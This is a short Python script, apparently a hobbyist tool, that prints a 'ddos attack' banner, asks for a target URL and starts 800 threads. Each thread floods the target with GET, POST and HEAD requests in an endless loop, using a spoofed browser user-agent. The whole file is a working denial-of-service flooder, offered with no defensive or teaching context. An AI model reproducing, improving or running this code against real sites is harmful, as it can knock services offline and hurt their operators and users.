from threading import Thread
import pyfiglet,random,requests
ddosattack = pyfiglet.figlet_format("ddos attack")
print("\033[0;31m"+ddosattack)
users=[
    "Mozilla/5.0 (X11; U; Linux  x86_64 en-US; rv:1.9.1.3) Gecko/2009013 Firefox/3.5.3"
]
headers={
    'User-Agent':random.choice(users)
}
url=input("enter the link >> ")
def send():
    while True:
        requests.get(url,headers=headers)
        print("get ..")
        requests.post(url,headers=headers)
        print("post ..")
        requests.head(url,headers=headers)
        print("head ..")
if __name__=='__main__':
    for i in range (800):
        thr=Thread(target=send)
        thr.start()
